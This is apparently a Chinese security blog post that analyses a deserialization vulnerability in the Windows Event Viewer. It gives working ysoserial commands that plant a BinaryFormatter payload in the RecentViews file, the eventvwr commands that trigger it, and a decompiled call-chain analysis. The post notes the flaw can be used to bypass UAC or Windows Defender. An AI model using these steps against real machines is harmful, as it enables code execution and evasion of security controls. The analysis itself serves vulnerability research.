> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/A7Z720lavhNSjlNNc3nzng)

0x01 漏洞背景
=========

4 月 26 日 @Orange Tsai 在 Twitter 上发表一个有关 Windows 事件查看器的反序列化漏洞，可以用来绕过 Windows Defender 或者 ByPass UAC 等其它攻击场景，Orange 视频里也给出了攻击载荷 DataSet 

“

ysoserial.exe -o raw -f BinaryFormatter -g DataSet -c calc > %LOCALAPPDATA%\Microsoft\Eventv~1\RecentViews

”

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVc9y6LcTZ8yePD3vHpYDgtYTkibYEtzjKuakr0kE1hUKhObXsUPmPGr9A/640?wx_fmt=png)

0x02 漏洞复现
=========

@Orange Tsai 给出的 ysoserial DataSet 载荷因为笔者复现未成功，所以替换用 TypeConfuseDelegate 作为攻击载荷，%LOCALAPPDATA% 等同于 C:\Users \ 用户名 \ AppData\Local 目录，Eventv~1 代表目录名前 6 个字符 Eventv 开头的第 1 个目录，其实可指定为本地的 Event Viewer 文件夹，文件名一定得是固定的 RecentViews，至于为什么可以看后续的原理分析，ysoserial 生成攻击载荷命令如下，有个小小的建议：可以先打开一次事件查看器，便于操作系统创建 EventViewer 目录，否则执行 ysoserial 命令会抛出 "系统找不到路径" 错误

```
ysoserial.exe -o raw -f BinaryFormatter -g TypeConfuseDelegate -c calc > %LOCALAPPDATA%\Microsoft\Eventv~1\RecentViews

```

打开 Windows 事件查看器或者输入如下所示的命令行均可触发漏洞

```
cmd/c eventvwr.msc
cmd/c eventvwr.exe

```

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVcB2mANodZWo6XyQViboNIz9SlliaVYk742XfibibNjHic8wEic1goqajItuKg/640?wx_fmt=png)

0x03 调用链分析
==========

打开事件查看器 Windows 系统会启动 mmc.exe 去关联 eventvwr.msc，进中 mmc.exe 右击 ” 属性 “-> .NET 程序集 如下图所示

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVcwiawwHrYYFCpVART8NRgptpaFJAPhNYDwJMEJmukh2eT1PmnDAtMTkw/640?wx_fmt=png)

反编译 EventViewer.dll，笔者从 EventViewer 事件查看器核心代码入手，至于它继承的父类 FormView 及基类 View 不再跟进，EventViewerHomePage 类是主入口，实现基类 View 里的虚方法 OnInitialize，

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVcts4fMG0wJekBMZcpcKhqJmr1fkQ1R2I45j8yB8MicASJPkJJDCPjegg/640?wx_fmt=png)

接着对 EventHomeControl 类做了初始化， UpdateUIDelegate(this.UpdateUI) 表示 EventHomeControl 读取数据并加载数据到可视化 UI 界面

```
public EventHomeControl()
{
    this.InitializeComponent();
    UIControlProcessing.SetControlSystemFont(this);
    UIControlProcessing.SetControlTitleFont(this.eventViewerLabel, this.Font);
    this.updateUI = new EventHomeControl.UpdateUIDelegate(this.UpdateUI);
    this.enableControl = new EventHomeControl.EnableControlDelegate(this.EnableControl);
}

```

this.UpdateUI 方法对可视化操作选项做了多重判断，有更新事件列表、有更新日志摘要、有更新事件列表当前对应的进程信息、还有我们重点关注的 case 1 更新最近访问浏览的信息，进入 UpdateRecentViewsUI 条件分支

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVcFu9ZBsU1BKRNDdCJR7cibJKZWYnt54DT3RqPP4ibEoRS29XEAvIPyqOg/640?wx_fmt=png)

UpdateRecentViewsUI 方法调用了 UpdateRecentViewsListViewUI，并且将属性 RecentViewsDataArrayList 的值传递给此方法，如下图

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVcIvQ8xwIOybRSc1YuUhHkj917ibG1JNf7RHqHnrl51q7iaYMchT46ArLg/640?wx_fmt=png)

RecentViewsDataArrayList 属于 EventsNode 类的成员，数据来源自 LoadDataForRecentView 执行后的结果，这里是将 EventsNode.recentViewsDataArrayList 的值赋给了 RecentViewsDataArrayList 属性，代码如下

```
internal ArrayList RecentViewsDataArrayList
{
    get
  {
      this.LoadDataForRecentViews();
      return EventsNode.recentViewsDataArrayList;
  }
}

```

LoadDataForRecentView 方法再调用 LoadMostRecentViewsDataFromFile，

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVc0j6UiaaRFGlfxibP7RClk5rLTmdtmf5psKwZBfAnfiaFEYdibaNfB64Ricw/640?wx_fmt=png)

读取 EventsNode.recentViewsFile 流后用 Deserialize(fileStream) 去反序列化，再将集合赋给 recentViewsDataArrayList，这样正常情况 RecentViewsDataArrayList 就获取到了最近浏览的数据。代码如下

```
private void LoadMostRecentViewsDataFromFile()
{
   try
  {
  if (!string.IsNullOrEmpty(EventsNode.recentViewsFile) && File.Exists(EventsNode.recentViewsFile))
    {
    FileStream fileStream = new FileStream(EventsNode.recentViewsFile, FileMode.Open);
    object syncRoot = EventsNode.recentViewsDataArrayList.SyncRoot;
    lock (syncRoot)
    {
    EventsNode.recentViewsDataArrayList = (ArrayList)new BinaryFormatter().Deserialize(fileStream);
    }
    fileStream.Close();
  }
}catch (FileNotFoundException){}
}

```

再来细看下 EventsNode.recentViewsFile，整个定义在 EventsNode 类构造方法里分了 3 步，笔者个人觉得判断逻辑有些罗里吧嗦的 ![](https://res.wx.qq.com/mpres/htmledition/images/icon/common/emotion_panel/emoji_ios/u1F61D.png) 

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVcmfdwTiadDQTOD4z8VxIicvFvZgjTFiaa4YT4lTAvZDmB7y7O1ORTAl3Ew/640?wx_fmt=png)

第 1 步
-----

Environment.SpecialFolder.CommonApplicationData 在 Windows 系统里表示 "C:\Users \ 用户名 \ AppData\Roaming"，StandardStringValues 类自定义多个静态变量，如 MicrosoftFolderName 代表 "Microsoft", LIN_EventViewer 代表 "Event Viewer"；

第 2 步
-----

用 CommonApplicationData 替代 LocalApplicationData，LocalApplicationData 代表 "C:\Users \ 用户名 \ AppData\Local"；

第 3 步
-----

将前两步和 “RecentViews” 串起来，最终得到 recentViewsFile = ”C:\Users \ 用户名 \ AppData\Local\Microsoft\Event Viewer\RecentViews“，所以笔者在上小节复现的时候提到 RecentViews 文件名是固定的不能改。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVc6rrpYmBGibkILD5LIJbSW4PibzQVg31x2bozB4xVRJpK7dMLUO0QAAWw/640?wx_fmt=png)

如上图 ysoserial 生成攻击载荷写入到 \Microsoft\Event Viewer\RecentViews，打开事件查看器即可触发漏洞。

0x04 结语
=======

漏洞的主体调用链如下  

```
-> View -> FormView -> EventViewerHomePage -> EventHomeControl -> UpdateUIDelegate(委托)
-> UpdateUI -> UpdateRecentViewsUI -> UpdateRecentViewsListViewUI -> RecentViewsDataArrayList
-> LoadDataForRecentView -> LoadMostRecentViewsDataFromFile -> BinaryFormatter().Deserialize

```

文章还可以在我的博客上在线阅读 https://www.cnblogs.com/Ivan1ee，涉及的 PDF 和 Demo 已打包发布在星球，欢迎对. NET 安全关注和关心的大伙加入我们

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y83FZojRCRqoMsFLdwISWVcnHgiavyVJicWSXibAPzIdOqJrZ0c3icNNkpTUGnoHgf34K0c1AZlR4XINg/640?wx_fmt=jpeg)